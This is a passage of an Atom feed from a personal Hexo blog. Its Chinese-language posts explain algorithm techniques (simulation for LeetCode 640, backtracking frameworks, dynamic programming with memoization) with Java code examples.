<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Elijah Zheng&#39;s Blog</title>
  
  
  <link href="https://blog.zhengxiangling.com/atom.xml" rel="self"/>
  
  <link href="https://blog.zhengxiangling.com/"/>
  <updated>2023-11-18T08:04:15.229Z</updated>
  <id>https://blog.zhengxiangling.com/</id>
  
  <author>
    <name>Elijah Zheng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>模拟题，根据题目规则嵌套if找答案</title>
    <link href="https://blog.zhengxiangling.com/2023/11/18/%E6%A8%A1%E6%8B%9F%E9%A2%98%EF%BC%8C%E6%A0%B9%E6%8D%AE%E9%A2%98%E7%9B%AE%E8%A7%84%E5%88%99%E5%B5%8C%E5%A5%97if%E6%89%BE%E7%AD%94%E6%A1%88/"/>
    <id>https://blog.zhengxiangling.com/2023/11/18/%E6%A8%A1%E6%8B%9F%E9%A2%98%EF%BC%8C%E6%A0%B9%E6%8D%AE%E9%A2%98%E7%9B%AE%E8%A7%84%E5%88%99%E5%B5%8C%E5%A5%97if%E6%89%BE%E7%AD%94%E6%A1%88/</id>
    <published>2023-11-18T02:50:00.000Z</published>
    <updated>2023-11-18T08:04:15.229Z</updated>
    
    <content type="html"><![CDATA[<p>模拟，即题目给定规则，要求找到符合条件的解。</p><span id="more"></span><p>以算数计算题为例，求解模拟题的过程。</p><h5 id="640-求解方程"><a href="#640-求解方程" class="headerlink" title="640.求解方程"></a>640.求解方程</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/solve-the-equation/description/">640. 求解方程</a></p></blockquote><div class="px-5 pt-4"><div class="flex"></div><div class="xFUwe" data-track-load="description_content"><p>求解一个给定的方程，将<code>x</code>以字符串 <code>"x=#value"</code>&nbsp;的形式返回。该方程仅包含 <code>'+'</code> ， <code>'-'</code> 操作，变量&nbsp;<code>x</code>&nbsp;和其对应系数。</p><p>如果方程没有解或存在的解不为整数，请返回&nbsp;<code>"No solution"</code>&nbsp;。如果方程有无限解，则返回 <code>“Infinite solutions”</code> 。</p><p>题目保证，如果方程中只有一个解，则 <font color="#c7254e"><font face="Menlo, Monaco, Consolas, Courier New, monospace"><span style="font-size: 12.6px;"><span style="background-color: rgb(249, 242, 244);">'x'</span></span></font></font> 的值是一个整数。</p><p>&nbsp;</p><p><strong>示例 1：</strong></p><pre><strong>输入:</strong> equation = "x+5-3+x=6+x-2"<strong>输出:</strong> "x=2"</pre><p><strong>示例 2:</strong></p><pre><strong>输入:</strong> equation = "x=x"<strong>输出:</strong> "Infinite solutions"</pre><p><strong>示例 3:</strong></p><pre><strong>输入:</strong> equation = "2x=x"<strong>输出:</strong> "x=0"</pre><p>&nbsp;</p><p><strong>提示:</strong></p><ul>    <li><code>3 &lt;= equation.length &lt;= 1000</code></li>    <li><code>equation</code>&nbsp;只有一个&nbsp;<code>'='</code>.&nbsp;</li>    <li>方程由绝对值在&nbsp;<code>[0, 100]</code>&nbsp; 范围内且无任何前导零的整数和变量 <code>'x'</code>&nbsp;组成。<span style="display: block;"><span style="height: 0px;"><span style="position: absolute;">&ZeroWidthSpace;&ZeroWidthSpace;&ZeroWidthSpace;</span></span></span></li></ul></div></div><hr><ol><li><p>思路</p><blockquote><p>模拟题，分别对运算符进行判断，找出跟解相关的x和num的值，然后求解。</p></blockquote></li><li><p>解题方法</p><blockquote><p>‘+’和’-‘作为数值符号；’=’作为等式左边计算完毕的判断，然后把’x’和’num’的符号取反然后继续运算；’x’如果没有数字要记作1；最后的答案对’x’的值和’num’的值判断即可。</p></blockquote></li><li><p>复杂度</p></li></ol><ul><li><p>时间复杂度:</p><blockquote><p>跟方程表达式的长度相关，$O(n)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>$O(n)$。如果用 .charAt() 可以降为$O(1)$</p></blockquote></li></ul><ol start="4"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">solveEquation</span><span class="params">(String equation)</span> &#123;</span><br><span class="line">        <span class="comment">// 模拟法 对 + - = 和 x 分别做判断</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> equation.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>, num = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span>[] s = equation.toCharArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">po</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(index &lt; n) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> s[index];</span><br><span class="line">            <span class="comment">// 记录改变数字的符号</span></span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">                index ++;</span><br><span class="line">                po = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">                index ++;</span><br><span class="line">                po = -<span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;=&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// 左边算完了，对调算右边</span></span><br><span class="line">                x = -x; num = -num; po = <span class="number">1</span>;</span><br><span class="line">                index++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 求数字</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> index;</span><br><span class="line">                <span class="keyword">while</span>(j &lt; n &amp;&amp; s[j] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; s[j] != <span class="string">&#x27;-&#x27;</span> &amp;&amp; s[j] != <span class="string">&#x27;=&#x27;</span>) j++;</span><br><span class="line">                <span class="comment">// 如果数字后一位为x</span></span><br><span class="line">                <span class="keyword">if</span>(s[j-<span class="number">1</span>] == <span class="string">&#x27;x&#x27;</span>) &#123;</span><br><span class="line">                    x += ((j - <span class="number">1</span> == index) ? <span class="number">1</span> : Integer.parseInt(equation.substring(index, j - <span class="number">1</span>))) * po; </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 不为x，记录num的值</span></span><br><span class="line">                    num += Integer.parseInt(equation.substring(index, j)) * po;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 找完数字，继续查找下一个</span></span><br><span class="line">                index=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果没有x，只有数字，无解</span></span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">0</span> &amp;&amp; num != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No solution&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">0</span> &amp;&amp; num == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果没有x和数字，无穷解</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Infinite solutions&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;x=&quot;</span> + -<span class="number">1</span> * (num / x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;模拟，即题目给定规则，要求找到符合条件的解。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="模拟" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E6%A8%A1%E6%8B%9F/"/>
    
    
  </entry>
  
  <entry>
    <title>运用回溯算法，解决排列、组合和子集问题</title>
    <link href="https://blog.zhengxiangling.com/2023/10/17/%E8%BF%90%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95%EF%BC%8C%E8%A7%A3%E5%86%B3%E6%8E%92%E5%88%97%E3%80%81%E7%BB%84%E5%90%88%E5%92%8C%E5%AD%90%E9%9B%86%E9%97%AE%E9%A2%98/"/>
    <id>https://blog.zhengxiangling.com/2023/10/17/%E8%BF%90%E7%94%A8%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95%EF%BC%8C%E8%A7%A3%E5%86%B3%E6%8E%92%E5%88%97%E3%80%81%E7%BB%84%E5%90%88%E5%92%8C%E5%AD%90%E9%9B%86%E9%97%AE%E9%A2%98/</id>
    <published>2023-10-17T10:43:00.000Z</published>
    <updated>2023-11-17T14:27:30.012Z</updated>
    
    <content type="html"><![CDATA[<p>回溯算法本质上也是一种暴力穷举算法，可以理解为：每个回溯问题就是遍历一个决策树的过程，每个叶子节点都存在一个数值，寻找叶子结点是否为满足条件的值，然后收集全部满足条件的值的过程就是<code>回溯算法</code>。</p><p>排列、组合和子集问题，无非就是寻找决策树叶子节点的过程，只是这三个问题对树枝的遍历和剪/加树枝有稍微变化罢了，然后在区分一下三种边界条件：元素无重复不可复选、元素无重复可复选、元素可重复不可复选。</p><span id="more"></span><p><strong>回溯算法框架</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">result = []</span><br><span class="line">def <span class="title function_">backtrack</span><span class="params">(路径, 选择列表)</span>:</span><br><span class="line">    <span class="keyword">if</span> 满足结束条件:</span><br><span class="line">        result.add(路径)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> 选择 in 选择列表:</span><br><span class="line">        做选择</span><br><span class="line">        backtrack(路径, 选择列表)</span><br><span class="line">        撤销选择</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>形式一、元素无重不可复选，即 nums 中的元素都是唯一的，每个元素最多只能被使用一次，backtrack 核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 组合/子集问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="comment">// 回溯算法标准框架</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line">        <span class="comment">// 注意参数</span></span><br><span class="line">        backtrack(nums, i + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 排列问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 剪枝逻辑</span></span><br><span class="line">        <span class="keyword">if</span> (used[i]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        used[i] = <span class="literal">true</span>;</span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line"></span><br><span class="line">        backtrack(nums);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">        used[i] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>形式二、元素可重不可复选，即 nums 中的元素可以存在重复，每个元素最多只能被使用一次，其关键在于排序和剪枝，backtrack 核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Arrays.sort(nums);</span><br><span class="line"><span class="comment">/* 组合/子集问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="comment">// 回溯算法标准框架</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 剪枝逻辑，跳过值相同的相邻树枝</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt; start &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line">        <span class="comment">// 注意参数</span></span><br><span class="line">        backtrack(nums, i + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Arrays.sort(nums);</span><br><span class="line"><span class="comment">/* 排列问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 剪枝逻辑</span></span><br><span class="line">        <span class="keyword">if</span> (used[i]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 剪枝逻辑，固定相同的元素在排列中的相对位置</span></span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>] &amp;&amp; !used[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        used[i] = <span class="literal">true</span>;</span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line"></span><br><span class="line">        backtrack(nums);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">        used[i] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>形式三、元素无重可复选，即 nums 中的元素都是唯一的，每个元素可以被使用若干次，只要删掉去重逻辑即可，backtrack 核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 组合/子集问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="comment">// 回溯算法标准框架</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line">        <span class="comment">// 注意参数</span></span><br><span class="line">        backtrack(nums, i);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 排列问题回溯算法框架 */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        track.addLast(nums[i]);</span><br><span class="line">        backtrack(nums);</span><br><span class="line">        <span class="comment">// 撤销选择</span></span><br><span class="line">        track.removeLast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;回溯算法本质上也是一种暴力穷举算法，可以理解为：每个回溯问题就是遍历一个决策树的过程，每个叶子节点都存在一个数值，寻找叶子结点是否为满足条件的值，然后收集全部满足条件的值的过程就是&lt;code&gt;回溯算法&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;排列、组合和子集问题，无非就是寻找决策树叶子节点的过程，只是这三个问题对树枝的遍历和剪/加树枝有稍微变化罢了，然后在区分一下三种边界条件：元素无重复不可复选、元素无重复可复选、元素可重复不可复选。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    <category term="回溯算法" scheme="https://blog.zhengxiangling.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="回溯算法" scheme="https://blog.zhengxiangling.com/tags/%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>动态规划求最值问题</title>
    <link href="https://blog.zhengxiangling.com/2023/10/16/%E8%A7%84%E5%88%92%E6%B1%82%E6%9C%80%E5%80%BC%E9%97%AE%E9%A2%98/"/>
    <id>https://blog.zhengxiangling.com/2023/10/16/%E8%A7%84%E5%88%92%E6%B1%82%E6%9C%80%E5%80%BC%E9%97%AE%E9%A2%98/</id>
    <published>2023-10-16T11:18:00.000Z</published>
    <updated>2023-11-17T14:27:30.011Z</updated>
    
    <content type="html"><![CDATA[<p>求最值问题，比如最长序列、最短距离等，不考虑时间和空间都可以通过暴力穷举的方式遍历获得结果，通过对穷举的过程进行优化减少重复开销的过程，即动态规划。</p><p>动态规划的重点，就是如何确定 <code>状态转移方程</code> 和 通过 <code>备忘录</code> 空间换时间降低时间复杂度（优化穷举）。</p><span id="more"></span><p>以拿硬币举例，从 <code>1,2,5</code> 从拿硬币，求 <code>amount</code> 满足 <code>11</code> 时的最少硬币数量。</p><h5 id="状态转移方程构建"><a href="#状态转移方程构建" class="headerlink" title="状态转移方程构建"></a>状态转移方程构建</h5><p><strong>1.确定 base case</strong><br>即确定满足什么边界条件时 <code>return</code> 直接结束当前递归。<br>其中，例子的边界条件为：当 <code>amount == 0</code> 时 返回 <code>0</code>，当 <code>amount &lt; 0</code> 时无解，返回 <code>-1</code>。 </p><p><strong>2.确定 状态</strong><br>即原问题和子问题都会变化的变量。<br>其中，例子的状态为 <code>amount</code>，可以看出每拿走一个硬币 <code>amount</code> 就会改变，并向 <code>base case</code> 靠近，直至匹配。</p><p><strong>3.明确 选择</strong><br>即导致状态改变的行为。<br>其中，例子的选择为拿硬币。</p><p><strong>4.明确 dp 的定义</strong><br><code>dp</code> 函数即递归找最值的函数，递归一般分为 自顶向下 和 自底向上 两种，框架如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 自顶向下递归的动态规划</span><br><span class="line">def <span class="title function_">dp</span><span class="params">(状态<span class="number">1</span>, 状态<span class="number">2</span>, ...)</span>:</span><br><span class="line">    <span class="keyword">for</span> 选择 in 所有可能的选择:</span><br><span class="line">        # 此时的状态已经因为做了选择而改变</span><br><span class="line">        result = 求最值(result, dp(状态<span class="number">1</span>, 状态<span class="number">2</span>, ...))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"># 自底向上迭代的动态规划</span><br><span class="line"># 初始化 base <span class="keyword">case</span></span><br><span class="line">dp[<span class="number">0</span>][<span class="number">0</span>][...] = base <span class="keyword">case</span></span><br><span class="line"># 进行状态转移</span><br><span class="line"><span class="keyword">for</span> 状态<span class="number">1</span> in 状态<span class="number">1</span>的所有取值：</span><br><span class="line">    <span class="keyword">for</span> 状态<span class="number">2</span> in 状态<span class="number">2</span>的所有取值：</span><br><span class="line">        <span class="keyword">for</span> ...</span><br><span class="line">            dp[状态<span class="number">1</span>][状态<span class="number">2</span>][...] = 求最值(选择<span class="number">1</span>，选择<span class="number">2.</span>..)</span><br></pre></td></tr></table></figure><p>对比如下解法看出区别：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自顶向下</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> N)</span> &#123;</span><br><span class="line">    <span class="comment">// 备忘录全初始化为 0</span></span><br><span class="line">    <span class="type">int</span>[] memo = <span class="keyword">new</span> <span class="title class_">int</span>[N + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 进行带备忘录的递归</span></span><br><span class="line">    <span class="keyword">return</span> dp(memo, N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带着备忘录进行递归</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dp</span><span class="params">(<span class="type">int</span>[] memo, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span> || n == <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">    <span class="comment">// 已经计算过，不用再计算了</span></span><br><span class="line">    <span class="keyword">if</span> (memo[n] != <span class="number">0</span>) <span class="keyword">return</span> memo[n];</span><br><span class="line">    memo[n] = dp(memo, n - <span class="number">1</span>) + dp(memo, n - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> memo[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 自底向上</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> N)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (N == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[N + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>; dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 状态转移</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= N; i++) &#123;</span><br><span class="line">        dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[N];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="备忘录-memo"><a href="#备忘录-memo" class="headerlink" title="备忘录 memo"></a>备忘录 memo</h5><p>备忘录的作用，用于解决重复计算的问题。每次解决子问题的时候，先去备忘录查一下是否有结果，如果有直接使用，避免重复计算。例子如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> N)</span> &#123;</span><br><span class="line">    <span class="comment">// 备忘录全初始化为 0</span></span><br><span class="line">    <span class="type">int</span>[] memo = <span class="keyword">new</span> <span class="title class_">int</span>[N + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 进行带备忘录的递归</span></span><br><span class="line">    <span class="keyword">return</span> dp(memo, N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带着备忘录进行递归</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dp</span><span class="params">(<span class="type">int</span>[] memo, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span> || n == <span class="number">1</span>) <span class="keyword">return</span> n;</span><br><span class="line">    <span class="comment">// 已经计算过，不用再计算了</span></span><br><span class="line">    <span class="keyword">if</span> (memo[n] != <span class="number">0</span>) <span class="keyword">return</span> memo[n];</span><br><span class="line">    memo[n] = dp(memo, n - <span class="number">1</span>) + dp(memo, n - <span class="number">2</span>);</span><br><span class="line">    <span 